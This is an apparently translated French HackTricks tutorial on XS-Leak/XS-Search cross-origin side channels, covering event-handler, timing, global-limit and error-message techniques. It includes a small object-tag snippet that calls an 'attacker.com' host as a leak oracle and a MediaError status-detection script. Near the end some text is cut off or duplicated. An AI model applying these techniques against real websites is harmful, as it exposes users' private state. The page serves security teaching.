# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire et **automatiser des workflows** gr√¢ce aux outils communautaires **les plus avanc√©s** au monde.\
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs exclusifs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informations de base**

XS-Search est une technique orient√©e vers l'**exfiltration d'informations cross-origin** en abusant des **attaques par canal auxiliaire**.

Il y a diff√©rents √©l√©ments dans ce type d'attaque :

* **Web Vuln√©rable** : C'est le web d'o√π nous voulons exfiltrer des informations.
* **Web de l'Attaquant** : C'est le web que l'attaquant cr√©e contenant l'exploit et que la victime acc√®de.
* **M√©thode d'Inclusion** : C'est la m√©thode utilis√©e pour charger le Web Vuln√©rable depuis le web de l'attaquant (comme window.open, iframe, fetch, balise HTML avec href...).
* **Technique de Fuite** : Apr√®s avoir acc√©d√© au web vuln√©rable, une technique sera utilis√©e pour diff√©rencier entre les √©tats potentiels du web avec les informations obtenues de la m√©thode d'inclusion utilis√©e.
* **√âtats** : Les 2 √©tats possibles que le web vuln√©rable peut avoir en fonction de la victime que nous voulons diff√©rencier.
* **Diff√©rences D√©tectables** : C'est l'information que l'attaquant doit essayer de d√©cider de l'√©tat du web vuln√©rable.

### Diff√©rences D√©tectables

Pour distinguer entre les 2 √©tats de la page vuln√©rable, plusieurs choses pourraient √™tre examin√©es :

* **Code de Statut**. Un attaquant peut distinguer **diff√©rents codes de statut de r√©ponse HTTP** cross-origin (par exemple, erreurs serveur, erreurs client ou erreurs d'authentification).
* **Utilisation d'API**. Cette diff√©rence d√©tectable permet √† un attaquant de d√©tecter **l'utilisation d'API Web** √† travers les pages, permettant √† un attaquant d'inf√©rer si une page cross-origin utilise une API Web JavaScript sp√©cifique.
* **Redirections**. Il est possible de d√©tecter si une application web a **navigu√© l'utilisateur vers une page diff√©rente**. Cela n'est pas limit√© aux redirections HTTP mais inclut √©galement les redirections d√©clench√©es par JavaScript ou HTML.
* **Contenu de la Page**. Ces diff√©rences d√©tectables apparaissent dans le corps de la r√©ponse HTTP elle-m√™me ou dans les sous-ressources incluses par la page. Par exemple, cela pourrait √™tre le **nombre de cadres inclus** (cf. XS-Leak sur Gitlab) ou des diff√©rences de taille d'images.
* **En-t√™te HTTP**. Un attaquant peut d√©tecter la pr√©sence d'un **en-t√™te de r√©ponse HTTP sp√©cifique** et peut √™tre capable de recueillir sa valeur. Cela inclut des en-t√™tes tels que X-Frame-Options, Content-Disposition et Cross-Origin-Resource-Policy.
* **Temps** : Un attaquant peut d√©tecter qu'une diff√©rence de temps coh√©rente existe entre 2 √©tats.

### M√©thodes d'Inclusion

* **√âl√©ments HTML**. HTML offre une vari√©t√© d'√©l√©ments qui permettent **l'inclusion de ressources cross-origin**. Des √©l√©ments comme les feuilles de style, les images ou les scripts, forcent le navigateur de la victime √† demander une ressource non-HTML sp√©cifi√©e. Une liste qui √©num√®re les √©l√©ments HTML possibles √† cette fin est disponible en ligne ([https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks)).
* **Cadres**. Des √©l√©ments tels que **iframe**, **object** et **embed** peuvent int√©grer directement d'autres ressources HTML dans la page de l'attaquant. Si la page **n'utilise pas de protection contre le framing**, le code JavaScript peut acc√©der √† l'objet window de la ressource encadr√©e via la propri√©t√© contentWindow.
* **Pop-ups**. La m√©thode **`window.open`** charge une ressource dans un nouvel onglet ou fen√™tre du navigateur. La m√©thode retourne une **poign√©e de fen√™tre** que le code JavaScript peut utiliser pour acc√©der aux m√©thodes et propri√©t√©s, qui respectent la SOP. Ces pop-ups sont souvent utilis√©s dans la connexion unique. Les navigateurs modernes ne permettent les pop-ups que s'ils sont d√©clench√©s par certaines interactions utilisateur. Pour les attaques XS-Leak, cette m√©thode est particuli√®rement utile car elle **contourne les restrictions de framing et de cookies pour une ressource cible**. De nouvelles versions de navigateurs ont r√©cemment ajout√© des moyens pour isoler les poign√©es de fen√™tre.
* **Requ√™tes JavaScript**. JavaScript permet d'envoyer des requ√™tes directement aux ressources cibles. Il existe deux mani√®res diff√©rentes √† cette fin : **XMLHttpRequests** et son successeur **Fetch API**. Contrairement aux m√©thodes d'inclusion pr√©c√©dentes, un attaquant a un contr√¥le pr√©cis sur la requ√™te √©mise, par exemple, si une redirection HTTP doit √™tre automatiquement suivie.

### Techniques de Fuite

* **Gestionnaire d'√âv√©nements**. Le gestionnaire d'√©v√©nements peut √™tre consid√©r√© comme la technique de fuite classique pour les XS-Leaks. Ils sont une source bien connue de diverses informations. Par exemple, le d√©clenchement de **onload** indique un chargement de ressource **r√©ussi** contrairement √† l'√©v√©nement onerror.
* **Messages d'Erreur**. Au-del√† des gestionnaires d'√©v√©nements, des messages d'erreur peuvent survenir comme **exceptions JavaScript** et **pages d'erreur sp√©ciales**. Les messages d'erreur peuvent √™tre lanc√©s √† diff√©rentes √©tapes, par exemple, directement par la technique de fuite. La technique de fuite peut soit utiliser des **informations suppl√©mentaires** directement **contenues** dans le **message d'erreur**, ou distinguer entre **l'apparition et l'absence d'un message d'erreur**.
* **Limites Globales**. Chaque ordinateur a ses limites physiques, il en va de m√™me pour un navigateur. Par exemple, la quantit√© de m√©moire disponible limite les onglets en cours d'ex√©cution d'un navigateur. Il en va de m√™me pour d'autres limites de navigateur qui sont appliqu√©es pour l'ensemble du navigateur. Si un attaquant peut d√©terminer **quand la limite est atteinte, cela peut √™tre utilis√© comme une technique de fuite**.
* **√âtat Global**. Les navigateurs ont **des √©tats globaux avec lesquels toutes les pages peuvent interagir**. Si cette interaction est d√©tectable depuis le site web de l'attaquant, elle peut √™tre utilis√©e comme une technique de fuite. Par exemple, l'interface **History** permet de manipuler les pages visit√©es dans un onglet ou un cadre. Cela cr√©e un √©tat global car le **nombre d'entr√©es** permet √† un attaquant de tirer des conclusions sur les pages cross-origin.
* **API de Performance**. L'API de Performance est utilis√©e pour acc√©der aux **informations de performance de la page actuelle**. Leurs entr√©es incluent des donn√©es de timing r√©seau d√©taill√©es pour le document et chaque ressource charg√©e par la page. Cela permet √† un attaquant de tirer **des conclusions sur les ressources demand√©es**. Par exemple, nous avons identifi√© des cas o√π les navigateurs ne cr√©eront pas d'entr√©es de performance pour certaines requ√™tes.
* **Attributs Lisibles**. HTML a plusieurs **attributs qui sont lisibles cross-origin**. Cet acc√®s en lecture peut √™tre utilis√© comme une technique de fuite. Par exemple, le code JavaScript peut lire le nombre de cadres inclus dans une page web cross-origin avec la propri√©t√© window.frame.length.

#### **Techniques bas√©es sur le Timing**

Certaines des techniques suivantes vont utiliser le timing comme partie du processus pour d√©tecter des diff√©rences dans les √©tats possibles des pages web. Il existe diff√©rentes mani√®res de mesurer le temps dans un navigateur web.

**Horloges** : L'API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) permet aux d√©veloppeurs d'obtenir des mesures de timing de haute r√©solution.\
Il existe un nombre consid√©rable d'API que les attaquants peuvent abuser pour cr√©er des horloges implicites : [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), animations CSS, et d'autres.\
Pour plus d'infos : [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## XSinator

XSinator est un outil automatique pour **v√©rifier les navigateurs contre plusieurs XS-Leaks connus** expliqu√©s dans son article : [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)\
Vous pouvez acc√©der √† l'outil sur [https://xsinator.com/](https://xsinator.com/)

{% hint style="warning" %}
**XS-Leaks Exclus** : Nous avons d√ª exclure les XS-Leaks qui d√©pendent des **service workers** car ils interf√©reraient avec d'autres fuites dans XSinator. De plus, nous avons choisi d'**exclure les XS-Leaks qui d√©pendent de la mauvaise configuration et des bugs dans une application web sp√©cifique**. Par exemple, les mauvaises configurations de CrossOrigin Resource Sharing (CORS), les fuites de postMessage ou le Cross-Site Scripting. De plus, nous avons exclu les XS-Leaks bas√©s sur le temps car ils souffrent souvent d'√™tre lents, bruyants et impr√©cis.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire et **automatiser des workflows** gr√¢ce aux outils communautaires **les plus avanc√©s** au monde.\
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Techniques de Gestionnaire d'√âv√©nements

### Onload/Onerror

* **M√©thodes d'Inclusion** : Cadres, √âl√©ments HTML
* **Diff√©rence D√©tectable** : Code de Statut
* **Plus d'infos** : [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **R√©sum√©** : si en essayant de charger une ressource les √©v√©nements onerror/onload sont d√©clench√©s lorsque la ressource est charg√©e avec succ√®s/insucc√®s, il est possible de d√©terminer le code de statut.
* **Exemple de code** : [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

L'exemple de code essaie de **charger des objets de scripts depuis JS**, mais **d'autres balises** telles que des objets, des feuilles de style, des images, des audios pourraient √©galement √™tre utilis√©es. De plus, il est √©galement possible d'injecter la **balise directement** et de d√©clarer les √©v√©nements `onload` et `onerror` √† l'int√©rieur de la balise (au lieu de l'injecter depuis JS).

Il existe √©galement une version sans script de cette attaque :
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Dans ce cas, si `example.com/404` n'est pas trouv√©, `attacker.com/?error` sera charg√©.

### D√©lai de chargement (Onload Timing)

* **M√©thodes d'inclusion** : √âl√©ments HTML
* **Diff√©rence d√©tectable** : D√©lai (g√©n√©ralement d√ª au contenu de la page, code de statut)
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **R√©sum√©** : L'API [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) peut √™tre utilis√©e pour mesurer le temps n√©cessaire pour effectuer une requ√™te. Cependant, d'autres horloges pourraient √™tre utilis√©es, telles que l'API [**PerformanceLongTaskTiming**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) qui peut identifier les t√¢ches s'ex√©cutant pendant plus de 50 ms.
* **Exemple de code** : [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) un autre exemple dans :

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### D√©lai de chargement + T√¢che lourde forc√©e (Onload Timing + Forced Heavy Task)

Cette technique est similaire √† la pr√©c√©dente, mais l'**attaquant** va √©galement **forcer** une action pour prendre un **temps significatif** lorsque la **r√©ponse est positive ou n√©gative** et mesurer ce temps.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### D√©lai de d√©chargement (unload/beforeunload Timing)

* **M√©thodes d'inclusion** : Cadres (Frames)
* **Diff√©rence d√©tectable** : D√©lai (g√©n√©ralement d√ª au contenu de la page, code de statut)
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **R√©sum√©** : L'horloge [SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) peut √™tre utilis√©e pour mesurer le temps n√©cessaire pour effectuer une requ√™te. D'autres horloges pourraient √™tre utilis√©es.
* **Exemple de code** : [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Les √©v√©nements [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) et [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event) peuvent √™tre utilis√©s pour mesurer le temps n√©cessaire pour r√©cup√©rer une ressource. Cela fonctionne parce que **`beforeunload`** est d√©clench√© lorsque le navigateur **demande une nouvelle navigation**, tandis que **`unload`** est d√©clench√© lorsque cette **navigation se produit r√©ellement**. En raison de ce comportement, il est possible de calculer la diff√©rence de temps entre ces deux √©v√©nements et de mesurer le **temps qu'il a fallu au navigateur pour terminer la r√©cup√©ration de la ressource**.

### D√©lai de chargement dans un cadre sandbox√© + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **M√©thodes d'inclusion** : Cadres (Frames)
* **Diff√©rence d√©tectable** : D√©lai (g√©n√©ralement d√ª au contenu de la page, code de statut)
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **R√©sum√©** : L'API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) peut √™tre utilis√©e pour mesurer le temps n√©cessaire pour effectuer une requ√™te. D'autres horloges pourraient √™tre utilis√©es.
* **Exemple de code** : [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Si une page n'a pas de [protections contre le framing](https://xsleaks.dev/docs/defenses/opt-in/xfo/) impl√©ment√©es, un attaquant peut mesurer combien de temps il faut pour que la page et toutes les sous-ressources se chargent sur le r√©seau. Par d√©faut, le gestionnaire `onload` pour un iframe est invoqu√© apr√®s que toutes les ressources aient √©t√© charg√©es et que tout le JavaScript ait fini de s'ex√©cuter. Mais, un attaquant peut √©liminer le bruit de l'ex√©cution du script en incluant l'attribut [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) dans la balise `<iframe>`. Cet attribut bloque de nombreuses fonctionnalit√©s, y compris l'ex√©cution de JavaScript, ce qui r√©sulte en une mesure de r√©seau presque pure.

### #ID + erreur + onload

* **M√©thodes d'inclusion** : Cadres (Frames)
* **Diff√©rence d√©tectable** : Contenu de la page
* **Plus d'infos** :
* **R√©sum√©** : Si vous pouvez provoquer une erreur sur la page lorsque le contenu correct est acc√©d√© et la faire charger correctement lorsque n'importe quel contenu est acc√©d√©, alors vous pouvez cr√©er une boucle pour extraire toutes les informations sans mesurer le temps.
* **Exemple de code** :

Supposons que vous pouvez **ins√©rer** la **page** qui contient le contenu **secret** **dans un Iframe**.

Vous pouvez **faire rechercher √† la victime** le fichier contenant "_**flag**_" en utilisant un **Iframe** (exploitant un CSRF par exemple). √Ä l'int√©rieur de l'Iframe, vous savez que l'√©v√©nement _**onload**_ sera **toujours ex√©cut√© au moins une fois**. Ensuite, vous pouvez **changer** l'**URL** de l'**iframe** en modifiant seulement le **contenu** du **hash** √† l'int√©rieur de l'URL.

Par exemple :

1. **URL1** : www.attacker.com/xssearch#try1
2. **URL2** : www.attacker.com/xssearch#try2

Si la premi√®re URL a √©t√© **charg√©e avec succ√®s**, alors, en **changeant** la partie **hash** de l'URL, l'√©v√©nement **onload** **ne sera pas d√©clench√©** √† nouveau. Mais **si** la page a eu une sorte d'**erreur** lors du **chargement**, alors, l'√©v√©nement **onload** sera **d√©clench√© √† nouveau**.

Ensuite, vous pouvez **distinguer entre** une page **charg√©e correctement** ou une page qui a une **erreur** lorsqu'elle est acc√©d√©e.

### Ex√©cution de Javascript

* **M√©thodes d'inclusion** : Cadres (Frames)
* **Diff√©rence d√©tectable** : Contenu de la page
* **Plus d'infos** :
* **R√©sum√©** : Si la **page** **renvoie** le contenu **sensible**, **ou** un contenu qui peut √™tre **contr√¥l√©** par l'utilisateur. L'utilisateur pourrait d√©finir **du code JS valide dans le cas n√©gatif**, et **charger** chaque essai √† l'int√©rieur de balises **`<script>`**, donc dans les cas **n√©gatifs** le **code** de l'attaquant est **ex√©cut√©**, et dans les cas **affirmatifs** **rien** ne sera ex√©cut√©.
* **Exemple de code** :

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **M√©thodes d'inclusion** : √âl√©ments HTML
* **Diff√©rence d√©tectable** : Code de statut & En-t√™tes
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **R√©sum√©** : Les attaquants peuvent observer quand CORB est appliqu√© si une r√©ponse renvoie un `Content-Type` _prot√©g√© par CORB_ (et `nosniff`) avec le code de statut `2xx` qui entra√Æne le retrait du corps et des en-t√™tes de la r√©ponse par CORB. D√©tecter cette protection permet √† un attaquant de **fuir** la combinaison du **code de statut** (succ√®s vs. erreur) et du **`Content-Type` (prot√©g√© par CORB ou non).**
* **Exemple de code** :

Consultez le lien pour plus d'informations sur l'attaque.

### onblur

* **M√©thodes d'inclusion** : Cadres (Frames)
* **Diff√©rence d√©tectable** : Contenu de la page
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **R√©sum√©** : Fuir des donn√©es sensibles de l'attribut id ou name.
* **Exemple de code** : [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Il est possible de **charger une page** √† l'int√©rieur d'un **iframe** et d'utiliser le **`#id_value`** pour faire **concentrer la page sur l'√©l√©ment** de l'iframe avec l'id indiqu√©, puis si un signal **`onblur`** est d√©clench√©, l'√©l√©ment ID existe.\
Vous pouvez effectuer la m√™me attaque avec des balises **`portal`**.

### Diffusions postMessage <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **M√©thodes d'inclusion** : Cadres (Frames), Pop-ups
* **Diff√©rence d√©tectable** : Utilisation de l'API
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **R√©sum√©** : Recueillir des informations sensibles d'un postMessage ou utiliser la pr√©sence de postMessages comme un oracle pour conna√Ætre le statut de l'utilisateur sur la page
* **Exemple de code** : `Tout code √©coutant tous les postMessages.`

Les applications utilisent souvent des [diffusions postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) pour partager des informations avec d'autres origines. En √©coutant ces messages, on pourrait trouver des **infos sensibles** (potentiellement si le param√®tre `targetOrigin` n'est pas utilis√©). Aussi, le fait de recevoir un message peut √™tre **utilis√© comme un oracle** (vous ne recevez ce type de message que si vous √™tes connect√©).

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire et **automatiser facilement des workflows** aliment√©s par les outils communautaires **les plus avanc√©s** du monde.\
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Techniques de limites globales

### API WebSocket

* **M√©thodes d'inclusion** : Cadres (Frames), Pop-ups
* **Diff√©rence d√©tectable** : Utilisation de l'API
* **Plus d'infos** : [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **R√©sum√©** : √âpuiser la limite de connexion WebSocket r√©v√®le le nombre de connexions WebSocket d'une page cross-origin.
* **Exemple de code** : [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Il est possible d'identifier si, et combien, **de connexions WebSocket une page cible utilise**. Cela permet √† un attaquant de d√©tecter des √©tats d'application et de fuir des informations li√©es au nombre de connexions WebSocket.

Si une **origine** utilise le **nombre maximum de connexions WebSocket**, ind√©pendamment de leur √©tat de connexion, la cr√©ation de **nouveaux objets entra√Ænera des exceptions JavaScript**. Pour ex√©cuter cette attaque, le site Web de l'attaquant ouvre le site Web cible dans un pop-up ou un iframe et ensuite, apr√®s que le site Web cible a √©t√© charg√©, tente de cr√©er le nombre maximum de connexions WebSocket possible. Le **nombre d'exceptions lanc√©es** est le **nombre de connexions WebSocket utilis√©es par la fen√™tre du site Web cible**.

### API de paiement

* **M√©thodes d'inclusion** : Cadres (Frames), Pop-ups
* **Diff√©rence d√©tectable** : Utilisation de l'API
* **Plus d'infos** : [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **R√©sum√©** : D√©tecter la demande de paiement car une seule peut √™tre active √† la fois.
* **Exemple de code** : [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Cette fuite XS permet √† un attaquant de **d√©tecter quand une page cross-origin initie une demande de paiement**.

Parce que **seule une demande de paiement peut √™tre active** √† la fois, si le site Web cible utilise l'API de demande de paiement, tout **autre tentative d'utiliser cette API √©chouera**, et provoquera une **exception JavaScript**. L'attaquant peut exploiter cela en **tentant p√©riodiquement de montrer l'interface utilisateur de l'API de paiement**. Si une tentative provoque une exception, le site Web cible l'utilise actuellement. L'attaquant peut masquer ces tentatives p√©riodiques en fermant imm√©diatement l'interface utilisateur apr√®s sa cr√©ation.

### Mesure de la boucle d'√©v√©nements (Timing the Event Loop) <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **M√©thodes d'inclusion** :
* **Diff√©rence d√©tectable** : D√©lai (g√©n√©ralement d√ª au contenu de la page, code de statut)
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **R√©sum√©** : Mesurer le temps d'ex√©cution d'un web en abusant de la boucle d'√©v√©nements JS √† thread unique.
* **Exemple de code** :

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

Le mod√®le de concurrence de JavaScript est bas√© sur une [boucle d'√©v√©nements √† thread unique](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) ce qui signifie **qu'il ne peut ex√©cuter qu'une t√¢che √† la fois**.\
Inf√©rer **combien de temps le code d'une origine diff√©rente prend pour s'ex√©cuter** en mesurant combien de temps il **prend pour s'ex√©cuter ensuite dans le pool d'√©v√©nements**. L'attaquant continue d'envoyer des √©v√©nements √† la boucle d'√©v√©nements avec des propri√©t√©s fixes, qui seront √©ventuellement distribu√©s si le pool est vide. D'autres origines envoient des √©v√©nements au m√™me pool, et c'est l√† qu'un **attaquant d√©duit la diff√©rence de temps en d√©tectant si un retard s'est produit avec l'une de ses t√¢ches**.

{% hint style="warning" %}
Dans une mesure de temps d'ex√©cution, il est possible d'**√©liminer** les **facteurs r√©seau** pour obtenir des **mesures plus pr√©cises**. Par exemple, en chargeant les ressources utilis√©es par la page avant
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
```markdown
La propri√©t√© message de l'interface **`MediaError`** contient une **cha√Æne diff√©rente pour les ressources qui se chargent avec succ√®s**. Cela permet √† un attaquant de d√©duire le statut de la r√©ponse pour une ressource cross-origin.

### Erreur CORS

* **M√©thodes d'inclusion** : Fetch API
* **Diff√©rence d√©tectable** : En-t√™te
* **Plus d'infos** : [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **R√©sum√© :** Dans SA, les messages d'erreur CORS r√©v√®lent l'URL compl√®te des redirections.
* **Exemple de code** : [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Cette technique permet √† un attaquant de r√©v√©ler la cible d'une redirection initi√©e par un site cross-origin.

CORS permet √† des ressources web accessibles publiquement d'√™tre lues et utilis√©es depuis n'importe quel site web. Dans les navigateurs bas√©s sur Webkit, il est possible **d'acc√©der aux messages d'erreur CORS lorsqu'une requ√™te CORS √©choue**. Un attaquant peut envoyer une requ√™te activ√©e par CORS √† un site cible qui **redirige** en fonction de l'√©tat de l'utilisateur. Lorsque le navigateur refuse la requ√™te, **l'URL compl√®te de la cible de la redirection est r√©v√©l√©e** dans le message d'erreur. Avec cette attaque, il est possible de d√©tecter des redirections, de r√©v√©ler des emplacements de redirection et des param√®tres de requ√™te sensibles.

### Erreur SRI

* **M√©thodes d'inclusion** : Fetch API
* **Diff√©rence d√©tectable** : En-t√™te
* **Plus d'infos** : [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **R√©sum√© :** Dans SA, les messages d'erreur CORS r√©v√®lent l'URL compl√®te des redirections.
* **Exemple de code** : [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Un attaquant peut r√©v√©ler la taille des r√©ponses cross-origin en raison de **messages d'erreur verbeux**.

L'attribut d'int√©grit√© d√©finit un hash cryptographique par lequel le navigateur peut v√©rifier qu'une ressource r√©cup√©r√©e n'a pas √©t√© manipul√©e. Ce m√©canisme de s√©curit√© est appel√© Int√©grit√© des Sous-ressources (SRI). Il est utilis√© pour la v√©rification de l'int√©grit√© des ressources servies depuis des r√©seaux de distribution de contenu (CDN). Pour pr√©venir les fuites de donn√©es, les ressources cross-origin doivent √™tre **activ√©es par CORS**. Sinon, la r√©ponse n'est pas √©ligible pour la validation de l'int√©grit√©. De mani√®re similaire √† l'erreur CORS XS-Leak, il est possible d'intercepter le **message d'erreur apr√®s qu'une requ√™te fetch avec un attribut d'int√©grit√© √©choue**. Un attaquant peut d√©clencher **volontairement** cette **erreur** sur n'importe quelle requ√™te en sp√©cifiant une **valeur de hash erron√©e**. Dans SA, ce message d'erreur r√©v√®le la longueur du contenu de la ressource demand√©e. Un attaquant peut utiliser cette fuite pour d√©tecter des diff√©rences dans la taille de la r√©ponse, ce qui permet des attaques XS-Leak puissantes.

### Violation/D√©tection CSP

* **M√©thodes d'inclusion** : Pop-ups
* **Diff√©rence d√©tectable** : Code de Statut
